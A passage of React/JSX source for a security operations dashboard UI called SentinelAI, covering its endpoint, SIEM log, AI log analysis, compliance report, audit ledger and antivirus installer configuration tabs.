                    ? "bg-emerald-600/15 text-emerald-400 border-emerald-500/30 hover:bg-emerald-600/30"
                    : "bg-slate-900 text-slate-550 border-slate-850 cursor-not-allowed"
                }`}
                title={role !== "SecOps-Admin" ? "Requires SecOps Admin Role" : "Deploy patches to all hosts"}
                id="global-heal-endpoints-btn"
              >
                <Zap className="w-3.5 h-3.5" />
                <span>Heal Class Workspace</span>
              </button>
            )}
          </div>

          {/* ACTIVE TAB VIEWS */}
          <div className="bg-slate-900/30 border border-slate-850 rounded-2xl p-5 min-h-[460px] flex flex-col" id="dashboard-active-view-container">
            
            {/* TAB 1: NETWORK ENDPOINTS LIST */}
            {activeTab === "endpoints" && (
              <div className="flex-1 flex flex-col" id="view-endpoints">
                <div className="flex items-center justify-between pb-4 border-b border-slate-850">
                  <div>
                    <h2 className="text-base font-semibold text-white tracking-tight flex items-center gap-2">
                      <Network className="w-4 h-4 text-indigo-400" />
                      Isolated Directory Nodes for <span className="text-indigo-300 font-mono font-medium text-xs bg-indigo-500/10 py-1 px-2.5 rounded border border-indigo-500/20">{tenantLabel(tenant)}</span>
                    </h2>
                    <p className="text-xs text-slate-400 mt-1">
                      Showing isolated state of live machines reporting to SentinelAI endpoint agents.
                    </p>
                  </div>
                  <div className="text-[10px] bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 font-mono py-1 px-2.5 rounded-full uppercase flex items-center gap-1.5">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
                    Tenancy Grid AirGapped
                  </div>
                </div>

                <div className="mt-4 flex-1 space-y-4">
                  {currentTenantEndpoints.map((node) => {
                    const insecureCves = node.vulnerabilities.filter(v => !v.patched);
                    return (
                      <div 
                        key={node.id}
                        className={`p-4 rounded-xl border transition-all duration-300 flex flex-col md:flex-row md:items-center justify-between gap-4 ${
                          node.status === "Compromised" 
                            ? "bg-red-950/10 border-red-500/30 shadow-md shadow-red-950/5" 
                            : node.status === "Vulnerable" 
                              ? "bg-amber-950/10 border-amber-500/20" 
                              : "bg-slate-900/40 border-slate-800"
                        }`}
                        id={`endpoint-row-${node.id}`}
                      >
                        {/* Host Identification */}
                        <div className="flex items-start gap-3">
                          <div className={`mt-1 p-2 rounded-lg border ${
                            node.status === "Compromised" 
                              ? "bg-red-600/10 border-red-500/30 text-red-400" 
                              : node.status === "Vulnerable" 
                                ? "bg-amber-600/10 border-amber-500/30 text-amber-400" 
                                : "bg-emerald-600/10 border-emerald-500/30 text-emerald-400"
                          }`}>
                            {node.type === "Database" ? <Database className="w-4.5 h-4.5" /> : node.type === "Cloud VM" ? <Cpu className="w-4.5 h-4.5" /> : <Network className="w-4.5 h-4.5" />}
                          </div>
                          <div>
                            <div className="flex items-center gap-2 flex-wrap">
                              <h4 className="text-sm font-semibold text-white tracking-tight font-mono">{node.name}</h4>
                              <span className="text-[10.5px] font-mono bg-slate-800/80 text-slate-350 px-2 py-0.5 rounded border border-slate-700/50">
                                {node.ip}
                              </span>
                              <span className="text-[10px] text-slate-400 font-mono bg-slate-800/40 px-2 py-0.5 rounded">
                                {node.os}
                              </span>
                            </div>
                            
                            {/* Live Resource Meters */}
                            <div className="flex items-center gap-4 text-[10.5px] text-slate-500 mt-2 font-mono">
                              <span className="flex items-center gap-1"><Cpu className="w-3 h-3" /> CPU Load: {node.cpuLoad}</span>
                              <span className="flex items-center gap-1"><Activity className="w-3 h-3" /> RAM: {node.ramUsage}</span>
                              <span>Synced: {node.lastScan}</span>
                            </div>
                          </div>
                        </div>

                        {/* Middle Status Column */}
                        <div className="flex items-center gap-6">
                          {/* Threat level score */}
                          <div className="text-right">
                            <div className="text-[10px] text-slate-500 uppercase tracking-widest font-mono">Anomalous Risk</div>
                            <div className="flex items-center gap-2 justify-end mt-0.5">
                              <span className={`text-base font-bold font-mono ${
                                node.mlScore > 80 ? "text-red-400" : node.mlScore > 40 ? "text-amber-400" : "text-emerald-400"
                              }`}>
                                {node.mlScore}%
                              </span>
                              <div className="w-16 bg-slate-800 h-1.5 rounded-full overflow-hidden">
                                <div 
                                  className={`h-full transition-all duration-500 ${
                                    node.mlScore > 80 ? "bg-red-500" : node.mlScore > 40 ? "bg-amber-500" : "bg-emerald-400"
                                  }`} 
                                  style={{ width: `${node.mlScore}%` }}
                                ></div>
                              </div>
                            </div>
                          </div>

                          {/* Compliance Tags & Vulnerability Details */}
                          <div className="min-w-[140px] flex flex-col justify-center">
                            {node.status === "Secure" ? (
                              <div className="text-xs text-emerald-400 flex items-center gap-1.5 bg-emerald-500/5 border border-emerald-500/20 py-1.5 px-3 rounded-lg w-full justify-center">
                                <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                                <span className="font-semibold">Fully Secure</span>
                              </div>
                            ) : (
                              <div className="flex flex-col gap-1 w-full text-center">
                                <span className={`text-[10.5px] font-semibold py-1 px-3 rounded-lg border ${
                                  node.status === "Compromised" 
                                    ? "bg-red-500/10 text-red-400 border-red-500/20" 
                                    : "bg-amber-500/10 text-amber-400 border-amber-500/20"
                                }`}>
                                  {node.status === "Compromised" ? "🚨 Active Threat!" : "⚠️ Vulnerable"}
                                </span>
                                <span className="text-[9.5px] font-mono text-slate-400">
                                  {insecureCves.length} Unresolved CVEs
                                </span>
                              </div>
                            )}
                          </div>
                        </div>

                        {/* Interactive Buttons (Actions SecOps can take) */}
                        <div className="flex items-center gap-2 border-t border-slate-800/40 pt-3 md:pt-0 md:border-0 justify-end">
                          {/* Scan Trigger */}
                          <button
                            onClick={() => runEndpointScan(node.id)}
                            disabled={activeScanning !== null}
                            className={`p-2.5 rounded-lg border text-xs font-medium transition flex items-center gap-1.5 ${
                              activeScanning === node.id 
                                ? "bg-slate-900 text-slate-450 border-slate-800 cursor-not-allowed" 
                                : "bg-slate-950 hover:bg-slate-900 border-slate-800 text-slate-300"
                            }`}
                            title="Perform ML behavioral scan on endpoint"
                            id={`scan-btn-${node.id}`}
                          >
                            <RefreshCw className={`w-3.5 h-3.5 ${activeScanning === node.id ? "animate-spin text-indigo-400" : ""}`} />
                            <span className="hidden sm:inline">{activeScanning === node.id ? "Analyzing..." : "Rescan"}</span>
                          </button>

                          {/* Automated Remediation Trigger */}
                          {node.status !== "Secure" && (
                            <button
                              onClick={() => deployAutomatedPatch(node.id)}
                              disabled={activePatching !== null || role !== "SecOps-Admin"}
                              className={`p-2.5 rounded-lg text-xs font-semibold border transition flex items-center gap-1.5 ${
                                activePatching === node.id
                                  ? "bg-slate-900 text-slate-500 border-slate-800 cursor-not-allowed"
                                  : role === "SecOps-Admin"
                                    ? "bg-emerald-600 hover:bg-emerald-500 text-white border-emerald-500 shadow-md shadow-emerald-900/10"
                                    : "bg-slate-950/50 border-slate-850/50 text-slate-500 cursor-not-allowed"
                              }`}
                              title={role !== "SecOps-Admin" ? "SecOps Admin authorization required" : "Deploy automated CVE hotfix"}
                              id={`patch-btn-${node.id}`}
                            >
                              <Zap className={`w-3.5 h-3.5 ${activePatching === node.id ? "animate-bounce" : ""}`} />
                              <span>{activePatching === node.id ? "Patching..." : "Auto-Patch"}</span>
                            </button>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* Sub vulnerability lists info cards */}
                {currentTenantEndpoints.some(e => e.status !== "Secure") && (
                  <div className="bg-slate-950/40 border border-slate-850 p-4 rounded-xl mt-6">
                    <h5 className="text-xs font-semibold text-slate-300 flex items-center gap-1.5 tracking-wide uppercase mb-3">
                      <AlertTriangle className="w-3.5 h-3.5 text-amber-500" />
                      Critical Outbound CVE Vulnerabilities pending immediate threat mitigation
                    </h5>
                    <div className="space-y-3">
                      {currentTenantEndpoints.flatMap(n => n.vulnerabilities.filter(v => !v.patched).map(v => ({ node: n.name, ...v }))).map((vuln, i) => (
                        <div key={i} className="flex justify-between items-start gap-4 p-2.5 rounded bg-slate-900/30 border border-slate-800 text-xs">
                          <div className="flex-1">
                            <div className="flex items-center gap-2">
                              <span className="font-mono text-red-400 font-semibold">{vuln.cve}</span>
                              <span className="text-[10.5px] text-slate-400 font-mono">({vuln.packageName})</span>
                              <span className="text-[10px] text-slate-500 font-mono">on {vuln.node}</span>
                            </div>
                            <p className="text-[11.5px] text-slate-350 mt-1">{vuln.description}</p>
                          </div>
                          <span className={`text-[9px] font-mono uppercase py-0.5 px-2 rounded tracking-wider border font-bold ${
                            vuln.severity === "Critical" ? "bg-red-500/10 text-red-400 border-red-500/30 animate-pulse" : "bg-amber-500/10 text-amber-400 border-amber-500/30"
                          }`}>
                            {vuln.severity}
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* TAB 2: SIEM CENTRAL LOGS ANALYZER */}
            {activeTab === "siem" && (
              <div className="flex-1 flex flex-col pt-1" id="view-siem">
                <div className="flex items-center justify-between pb-4 border-b border-slate-850">
                  <div>
                    <h2 className="text-base font-semibold text-white tracking-tight flex items-center gap-2">
                      <Terminal className="w-4 h-4 text-indigo-400" />
                      Live SIEM Pipeline Telemetry Feed
                    </h2>
                    <p className="text-xs text-slate-400 mt-1">
                      Aggregated audit trace logs reporting from enterprise routers, containers, databases, and endpoint managers.
                    </p>
                  </div>
                  <div className="text-[10.5px] text-indigo-400 font-mono">
                    Ingestion Status: <span className="text-emerald-400 font-bold bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">LIVE-FEED</span>
                  </div>
                </div>

                {/* Log feed console */}
                <div className="mt-4 flex-1 bg-slate-950 border border-slate-800 rounded-xl p-4 font-mono text-[11.5.px] text-slate-300 leading-relaxed overflow-y-auto max-h-[440px] space-y-2.5">
                  <div className="text-slate-500 p-2 border-b border-slate-900/60 flex justify-between items-center bg-slate-900/10">
                    <span># INGESTION COCKPIT CONNECTIONS</span>
                    <span className="text-xs">UTC TIMEZONE INGESTION</span>
                  </div>
                  {siemEvents.map((evt) => {
                    const sevColor = 
                      evt.severity === "Critical" ? "text-red-400 bg-red-500/10 border-red-500/30" : 
                      evt.severity === "High" ? "text-amber-400 bg-amber-500/10 border-amber-500/20" : 
                      evt.severity === "Medium" ? "text-indigo-400 bg-indigo-500/10" : "text-slate-400";

                    return (
                      <div key={evt.id} className="p-2 bg-slate-900/30 hover:bg-slate-900/60 rounded border border-slate-900/80 flex items-start justify-between gap-3 transition">
                        <div className="flex items-start gap-2.5">
                          <span className="text-slate-500 text-[11px] shrink-0">{evt.timestamp}</span>
                          <div className="flex-1">
                            <span className="text-sky-300 font-medium font-sans">[{evt.source}]</span>
                            <span className="text-slate-300 ml-2">{evt.event}</span>
                            <span className="text-[10px] ml-2 text-slate-500 bg-slate-950 py-0.5 px-1.5 rounded">
                              Type: {evt.type}
                            </span>
                          </div>
                        </div>
                        <span className={`text-[9.5px] uppercase font-bold py-0.5 px-2 rounded-full border ${sevColor}`}>
                          {evt.severity}
                        </span>
                      </div>
                    );
                  })}
                  <div className="pt-2 text-center text-[10.5px] text-slate-500">
                    --- Telemetry Connection Persistent & Active ---
                  </div>
                </div>
              </div>
            )}

            {/* TAB 3: AI SECURITY ASSISTANCE / THREATS COMMAND */}
            {activeTab === "analyst" && (
              <div className="flex-1 flex flex-col pt-1 shrink-0" id="view-analyst">
                <div className="flex items-center justify-between pb-4 border-b border-slate-850">
                  <div>
                    <h2 className="text-base font-semibold text-white tracking-tight flex items-center gap-2">
                      <Sparkles className="w-4 h-4 text-indigo-400 animate-pulse" />
                      AI Threat Command Anomaly Engine
                    </h2>
                    <p className="text-xs text-slate-400 mt-1">
                      Direct raw security log parser and immediate incident response step generator underwritten by server-side machine learning.
                    </p>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-12 gap-5 mt-5">
                  {/* Left Controls: Preset Choice & Custom Ingest */}
                  <div className="md:col-span-5 flex flex-col gap-4">
                    <div>
                      <label className="block text-xs font-semibold text-slate-300 tracking-wider uppercase mb-1.5 font-sans">
                        1. Select Log Preset Profile
                      </label>
                      <div className="flex flex-col gap-2">
                        {SAMPLE_LOGS.map((p, idx) => (
                          <button
                            key={idx}
                            onClick={() => selectPresetLog(idx)}
                            className={`p-2.5 text-left rounded-lg text-xs font-mono border transition flex items-center justify-between ${
                              selectedPresetLogIdx === idx 
                                ? "bg-indigo-600/10 border-indigo-500/50 text-indigo-300" 
                                : "bg-slate-900/50 border-slate-800 text-slate-400 hover:text-slate-200"
                            }`}
                            id={`log-preset-${idx}`}
                          >
                            <div>
                              <div className="font-semibold text-slate-200 text-[11.5px]">{p.title}</div>
                              <div className="text-[10px] text-slate-500 mt-0.5">Target: {p.endpointName}</div>
                            </div>
                            <span className="text-[10.5px] font-mono bg-slate-950 py-0.5 px-2 rounded text-slate-400 select-none">
                              {p.label}
                            </span>
                          </button>
                        ))}
                      </div>
                    </div>

                    <div className="flex-1 flex flex-col">
                      <label className="block text-xs font-semibold text-slate-300 tracking-wider uppercase mb-1.5 font-sans">
                        2. Raw Security Log Ingestion Shell
                      </label>
                      <textarea
                        value={customLog}
                        onChange={(e) => setCustomLog(e.target.value)}
                        className="flex-1 min-h-[160px] bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs font-mono text-emerald-400 shadow-inner focus:outline-none focus:ring-1 focus:ring-indigo-500 leading-relaxed"
                        placeholder="Paste enterprise Syslog, AWS Cloudtrail payload, Windows OS Event XML lines, or network flow metrics..."
                        id="ai-custom-log-input"
                      ></textarea>
                    </div>

                    <button
                      onClick={requestAIAnomalyAnalysis}
                      disabled={analyzingLog || !customLog.trim()}
                      className={`w-full py-2.5 rounded-lg text-xs font-semibold tracking-wider uppercase transition flex items-center justify-center gap-2 ${
                        analyzingLog 
                          ? "bg-slate-900 border border-slate-800 text-slate-500 cursor-not-allowed" 
                          : "bg-indigo-600 hover:bg-indigo-500 text-white border border-indigo-500 shadow-md shadow-indigo-900/30 cursor-pointer"
                      }`}
                      id="ai-trigger-analysis-btn"
                    >
                      <Sparkles className="w-3.5 h-3.5" />
                      <span>{analyzingLog ? "Processing Threat Stream..." : "Run ML Risk Assessment"}</span>
                    </button>
                  </div>

                  {/* Right Panel: Rendered AI Intel Results */}
                  <div className="md:col-span-7 bg-slate-950/60 border border-slate-850 rounded-xl p-4 flex flex-col min-h-[380px]">
                    <div className="flex items-center justify-between pb-2 border-b border-slate-950 text-slate-400">
                      <span className="text-xs uppercase font-semibold font-mono tracking-wider flex items-center gap-1.5 text-slate-300">
                        <Terminal className="w-3.5 h-3.5 text-emerald-400" />
                        AI Analysis Command Output Console
                      </span>
                      {analyzerResponse && (
                        <button
                          onClick={() => {
                            navigator.clipboard.writeText(analyzerResponse);
                            setCopyFeedback(true);
                            setTimeout(() => setCopyFeedback(false), 2000);
                          }}
                          className="text-xs hover:text-white flex items-center gap-1 bg-slate-900/80 hover:bg-slate-900 py-1 px-2 rounded border border-slate-800"
                        >
                          {copyFeedback ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                          <span>{copyFeedback ? "Copied!" : "Copy Report"}</span>
                        </button>
                      )}
                    </div>

                    <div className="flex-1 overflow-y-auto max-h-[340px] text-xs leading-relaxed text-slate-350 pr-1 mt-3">
                      {analyzingLog ? (
                        <div className="flex flex-col items-center justify-center h-full gap-3 py-12">
                          <RefreshCw className="w-8 h-8 text-indigo-400 animate-spin" />
                          <div className="text-center">
                            <span className="text-xs text-slate-450 font-mono uppercase tracking-widest block font-bold">Querying ML Security Model...</span>
                            <span className="text-[11.5px] text-slate-500 mt-1 block">Compiling diagnostic playbook & compliance mappings.</span>
                          </div>
                        </div>
                      ) : analyzerResponse ? (
                        <div className="markdown-body space-y-4 font-mono leading-relaxed" id="ai-response-rendered">
                          {analyzerResponse.includes("###") ? (
                            <div className="whitespace-pre-line text-[11.5px]">
                              {analyzerResponse}
                            </div>
                          ) : (
                            <pre className="whitespace-pre-wrap font-mono text-[11px] bg-slate-900 p-3 rounded border border-slate-850 text-slate-300">
                              {analyzerResponse}
                            </pre>
                          )}
                        </div>
                      ) : (
                        <div className="flex flex-col items-center justify-center h-full text-slate-500 text-center py-16">
                          <ShieldCheck className="w-12 h-12 text-slate-705 mb-2.5" />
                          <p className="font-mono text-xs uppercase tracking-widest text-slate-400">Log Ingest Sandbox Active</p>
                          <p className="text-[11.5px] text-slate-500 max-w-sm mt-1 mb-3">
                            Select a preset incident profile or drop custom network dumps on the left sidebar context, then trigger analysis.
                          </p>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* TAB 4: AUTOMATED IT AUDIT COMPLIANCE REPORT */}
            {activeTab === "compliance" && (
              <div className="flex-1 flex flex-col pt-1" id="view-compliance">
                <div className="flex items-center justify-between pb-4 border-b border-slate-850 animate-pulse">
                  <div>
                    <h2 className="text-base font-semibold text-white tracking-tight flex items-center gap-2">
                      <FileCheck className="w-4 h-4 text-emerald-400" />
                      IT Audit Compliance Readiness Report Generator
                    </h2>
                    <p className="text-xs text-slate-400 mt-1">
                      Instantly align machine, user access role logs, and patch states against stringent regulatory audits.
                    </p>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-12 gap-5 mt-5">
                  {/* Left Scope Form Selector */}
                  <div className="md:col-span-5 bg-slate-950/40 p-4 border border-slate-850 rounded-xl flex flex-col gap-4">
                    <h4 className="text-xs font-semibold text-slate-300 tracking-wider uppercase">Audit Framework Specifications</h4>
                    
                    <div>
                      <label className="block text-[11px] text-slate-400 uppercase tracking-wider mb-1.5 font-mono">1. Select Target Standard</label>
                      <select
                        value={selectedFramework}
                        onChange={(e) => setSelectedFramework(e.target.value)}
                        className="w-full bg-slate-950 font-sans border border-slate-800 rounded-lg text-xs py-2 px-3 text-white focus:outline-none focus:ring-1 focus:ring-indigo-500"
                        id="compliance-framework-select"
                      >
                        <option value="SOC2 Type II Security & Confidentiality">🔒 SOC2 Type II (TSC Security Criteria)</option>
                        <option value="GDPR Article 32 Systems Safeguards">🇪🇺 GDPR Article 32 (Data Privacy & Encryption)</option>
                        <option value="HIPAA Security Rule Safeguards (ePHI)">🏥 HIPAA Security Rule Safeguards (164.312 Code)</option>
                        <option value="ISO/IEC 27001 ISMS Compliance Framework">🌐 ISO/IEC 27001 Access Controls & Security Management</option>
                      </select>
                    </div>

                    <div>
                      <label className="block text-[11px] text-slate-400 uppercase tracking-wider mb-1.5 font-mono">2. Audit Corporate Scope</label>
                      <input
                        type="text"
                        value={selectedAuditScope}
                        onChange={(e) => setSelectedAuditScope(e.target.value)}
                        className="w-full bg-slate-950 border border-slate-800 rounded-lg text-xs py-2 px-3 text-white focus:outline-none focus:ring-1 focus:ring-indigo-500 font-sans"
                        placeholder="Define corporate assessment boundaries..."
                      />
                    </div>

                    {/* Pre-flight diagnostics stats summary */}
                    <div className="bg-slate-900/60 p-3 rounded-lg border border-slate-850 space-y-2">
                      <span className="text-[10px] text-slate-450 uppercase font-mono tracking-wider font-bold">Dynamic Assessment Engine Telemetry</span>
                      <div className="grid grid-cols-2 gap-2 text-xs font-mono">
                        <div className="bg-slate-950 p-2 rounded">
                          <span className="text-[10px] block text-slate-500">SECURE SHELVES</span>
                          <span className="text-emerald-400 font-bold">{metrics.secure} / {metrics.total} OK</span>
                        </div>
                        <div className="bg-slate-955 p-2 rounded">
                          <span className="text-[10px] block text-slate-500">GAP DETECTIONS</span>
                          <span className={`font-bold ${metrics.vulnerable > 0 ? "text-amber-400" : "text-emerald-400"}`}>
                            {metrics.vulnerable} Vulnerable
                          </span>
                        </div>
                      </div>
                    </div>

                    <button
                      onClick={compileITComplianceReport}
                      disabled={compilingReport}
                      className="w-full bg-emerald-600 hover:bg-emerald-500 text-white border border-emerald-500 py-2.5 rounded-lg text-xs font-semibold uppercase tracking-wider transition flex items-center justify-center gap-2"
                      id="compliance-compile-btn"
                    >
                      <FileCheck className="w-4 h-4" />
                      <span>{compilingReport ? "Generating Audit Manifest..." : "Compile Alignment Report"}</span>
                    </button>
                  </div>

                  {/* Compliance Report Output Viewer */}
                  <div className="md:col-span-7 bg-slate-950 border border-slate-850 rounded-xl p-4 flex flex-col min-h-[385px]">
                    <div className="flex justify-between items-center pb-2.5 border-b border-slate-900">
                      <span className="text-xs uppercase font-mono tracking-wider text-slate-350 flex items-center gap-1.5 font-bold">
                        <FileText className="w-4 h-4 text-emerald-400" />
                        Executive Compliance Document Preview
                      </span>
                      {compiledReport && (
                        <button
                          onClick={() => {
                            navigator.clipboard.writeText(compiledReport);
                            setCopyFeedback(true);
                            setTimeout(() => setCopyFeedback(false), 2000);
                          }}
                          className="text-xs hover:text-white flex items-center gap-1 bg-slate-900 p-1.5 rounded border border-slate-800"
                        >
                          {copyFeedback ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                          <span>{copyFeedback ? "Copied" : "Copy Document"}</span>
                        </button>
                      )}
                    </div>

                    <div className="flex-1 overflow-y-auto max-h-[345px] text-xs leading-relaxed text-slate-300 pr-1 mt-3">
                      {compilingReport ? (
                        <div className="flex flex-col items-center justify-center h-full gap-3 py-16">
                          <RefreshCw className="w-8 h-8 text-emerald-400 animate-spin" />
                          <div className="text-center font-mono">
                            <span className="text-xs text-emerald-400 uppercase tracking-widest block font-bold">Assembling Framework Scorecard...</span>
                            <span className="text-[11px] text-slate-500 mt-1 block">Cross-checking access logs, isolated states, and hotfix patching lists.</span>
                          </div>
                        </div>
                      ) : compiledReport ? (
                        <div className="space-y-4 font-mono text-[11px] whitespace-pre-wrap" id="compliance-rendered-markdown">
                          {compiledReport}
                        </div>
                      ) : (
                        <div className="flex flex-col items-center justify-center h-full text-slate-500 text-center py-20">
                          <FileText className="w-12 h-12 mb-3 text-slate-705" />
                          <p className="font-mono text-xs uppercase tracking-widest text-slate-400">Compliance Document Safe</p>
                          <p className="text-[11px] text-slate-500 max-w-sm mt-1">
                            Set your regulatory scope on the left parameters sidebar. Then trigger automated audit evaluation to compile your report.
                          </p>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* TAB 5: AUDIT LOG LEDGER / ACCREDITED COMPLIANCE TRAILS */}
            {activeTab === "ledger" && (
              <div className="flex-1 flex flex-col pt-1" id="view-ledger">
                <div className="flex items-center justify-between pb-4 border-b border-slate-850">
                  <div>
                    <h2 className="text-base font-semibold text-white tracking-tight flex items-center gap-2">
                      <History className="w-4 h-4 text-indigo-400" />
                      SentinelAI Forensic Cryptographic Audit Ledger
                    </h2>
                    <p className="text-xs text-slate-400 mt-1">
                      Chronological immutable event ledger capturing security user state transitions, multi-tenant interactions, automated patching actions, and user authorization role checks.
                    </p>
                  </div>
                  <span className="text-[10px] font-mono bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 py-1 px-2.5 rounded">
                    Audit Integrity: SEALED
                  </span>
                </div>

                <div className="mt-4 flex-1 overflow-x-auto">
                  <table className="w-full text-left font-mono text-xs">
                    <thead>
                      <tr className="border-b border-slate-850 text-slate-400 uppercase text-[10px] tracking-wider bg-slate-950/20">
                        <th className="py-2.5 px-3">Log ID</th>
                        <th className="py-2.5 px-3">ISO Timestamp</th>
                        <th className="py-2.5 px-3">Isolated Tenant</th>
                        <th className="py-2.5 px-3 font-sans">Role Context</th>
                        <th className="py-2.5 px-3">Remediation Action</th>
                        <th className="py-2.5 px-3">Execution details</th>
                        <th className="py-2.5 px-3">Integrity</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-900">
                      {auditLedger.map((trail) => (
                        <tr key={trail.id} className="hover:bg-slate-900/40 text-[11px] text-slate-300">
                          <td className="py-2.5 px-3 text-slate-505 font-semibold text-indigo-400">{trail.id}</td>
                          <td className="py-2.5 px-3 text-slate-450">{trail.timestamp}</td>
                          <td className="py-2.5 px-3 text-sky-305 font-semibold">{trail.tenant}</td>
                          <td className="py-2.5 px-3 text-slate-400 font-sans">{trail.role}</td>
                          <td className="py-2.5 px-3">
                            <span className="bg-slate-950 py-0.5 px-2 rounded border border-slate-850 font-bold tracking-tight text-[10px] text-emerald-300">
                              {trail.action}
                            </span>
                          </td>
                          <td className="py-2.5 px-3 text-slate-350 max-w-xs truncate" title={trail.details}>
                            {trail.details}
                          </td>
                          <td className="py-2.5 px-3">
                            <span className={`inline-flex items-center gap-1 text-[9.5px] uppercase py-0.5 px-1.5 rounded-full font-bold leading-none ${
                              trail.status === "Success" 
                                ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" 
                                : trail.status === "Warning" 
                                  ? "bg-amber-500/10 text-amber-500 border border-amber-500/20" 
                                  : "bg-red-500/10 text-red-500 border border-red-500/20"
                            }`}>
                              {trail.status === "Success" ? "● OK" : "● FAILED"}
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                  {auditLedger.length === 0 && (
                    <div className="text-center text-slate-500 py-12">No access audit operations compiled.</div>
                  )}
                </div>
              </div>
            )}

            {/* TAB 7: STANDALONE PC ANTIVIRUS & COMPACT MSI COMPILER */}
            {activeTab === "antivirus" && (
              <div className="flex-1 flex flex-col pt-1" id="view-antivirus">
                <div className="flex items-center justify-between pb-4 border-b border-slate-850">
                  <div>
                    <h2 className="text-base font-semibold text-white tracking-tight flex items-center gap-2">
                      <Cpu className="w-4 h-4 text-indigo-400" />
                      Windows Standalone Antivirus: MSI Client Compiler
                    </h2>
                    <p className="text-xs text-slate-400 mt-1">
                      Configure and build extremely lightweight, standalone PC antivirus bootstrappers. Optimized for low-memory environments with signature compression.
                    </p>
                  </div>
                  <span className="text-[10px] font-mono bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 py-1 px-2.5 rounded">
                    Build Pipeline: ONLINE
                  </span>
                </div>

                <div className="grid grid-cols-1 xl:grid-cols-12 gap-5 mt-5">
                  
                  {/* Left Column (7 cols): Configuration & Compilation Parameters */}
                  <div className="xl:col-span-7 space-y-5">
                    
                    {/* 1. Footprint Optimizer (Signature DB Size) */}
                    <div className="bg-slate-900/40 border border-slate-850 rounded-2xl p-4 space-y-4">
                      <div>
                        <div className="flex items-center gap-2">
                          <Database className="w-4 h-4 text-indigo-400" />
                          <h3 className="text-xs font-semibold uppercase tracking-wider text-slate-200">1. Signature Database Compact Mode</h3>
                        </div>
                        <p className="text-[11px] text-slate-400 mt-0.5">
                          Configure the signature memory layout to minimize client-side installer package sizes.
                        </p>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                        <button
                          onClick={() => setMsiDbPreset("micro")}
                          className={`p-3 text-left rounded-xl border text-xs transition duration-200 ${
                            msiDbPreset === "micro"
                              ? "bg-indigo-600/15 border-indigo-500 text-indigo-100 shadow-md shadow-indigo-950/20"
                              : "bg-slate-950/50 border-slate-850 text-slate-400 hover:text-slate-200 hover:border-slate-800"
                          }`}
                        >
                          <div className="font-semibold text-[11.5px] flex items-center justify-between">
                            <span>Micro-Signature Set</span>
                            <span className="text-[9.5px] font-mono py-0.5 px-1.5 rounded bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">85 KB</span>
                          </div>
                          <p className="text-[10.5px] text-slate-400 mt-1.5 leading-relaxed">
                            Ultra lightweight engine using 64-bit non-cryptographic hashes. Targets core malware branches with cloud fallbacks.
                          </p>
                        </button>

                        <button
                          onClick={() => setMsiDbPreset("cloud")}
                          className={`p-3 text-left rounded-xl border text-xs transition duration-200 ${
                            msiDbPreset === "cloud"
                              ? "bg-indigo-600/15 border-indigo-500 text-indigo-100 shadow-md shadow-indigo-950/20"
                              : "bg-slate-950/50 border-slate-850 text-slate-400 hover:text-slate-200 hover:border-slate-800"
                          }`}
                        >
                          <div className="font-semibold text-[11.5px] flex items-center justify-between">
                            <span>Zero-Trust Cloud</span>
                            <span className="text-[9.5px] font-mono py-0.5 px-1.5 rounded bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">140 KB</span>
                          </div>
                          <p className="text-[10.5px] text-slate-400 mt-1.5 leading-relaxed">
                            Bypasses heavy local data sets entirely. Performs sub-millisecond API telemetry queries to Sentinel Cloud Core.
                          </p>
                        </button>

                        <button
                          onClick={() => setMsiDbPreset("heuristics")}
                          className={`p-3 text-left rounded-xl border text-xs transition duration-200 ${
                            msiDbPreset === "heuristics"
                              ? "bg-indigo-600/15 border-indigo-500 text-indigo-100 shadow-md shadow-indigo-950/20"
                              : "bg-slate-950/50 border-slate-850 text-slate-400 hover:text-slate-200 hover:border-slate-800"
                          }`}
                        >
                          <div className="font-semibold text-[11.5px] flex items-center justify-between">
                            <span>Offline Heuristics</span>
                            <span className="text-[9.5px] font-mono py-0.5 px-1.5 rounded bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">2.4 MB</span>
                          </div>
                          <p className="text-[10.5px] text-slate-400 mt-1.5 leading-relaxed">
                            Includes complete local signature table and complex file entropy heuristics for offline air-gapped endpoints.
                          </p>
                        </button>
                      </div>
                    </div>

                    {/* 2. Embedded Binary Shields */}
                    <div className="bg-slate-900/40 border border-slate-850 rounded-2xl p-4 space-y-4">
                      <div>
                        <div className="flex items-center gap-2">
                          <Activity className="w-4 h-4 text-emerald-400" />
                          <h3 className="text-xs font-semibold uppercase tracking-wider text-slate-200">2. Real-Time Security Module Inclusions</h3>
                        </div>
                        <p className="text-[11px] text-slate-400 mt-0.5">
                          Toggle which active client-side assembly files will be compiled directly inside the payload cabinet.
                        </p>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        
                        {/* Driver 1 */}
                        <div className="flex items-center justify-between p-2.5 rounded-xl bg-slate-950/50 border border-slate-850">
                          <div className="flex items-start gap-2.5">
                            <input
                              type="checkbox"
                              checked={msiDriverEnabled}
                              onChange={(e) => setMsiDriverEnabled(e.target.checked)}
                              className="mt-1 accent-indigo-600 text-white rounded bg-slate-900 border-slate-800"
                              id="toggle-driver-kernel"
                            />
                            <div>
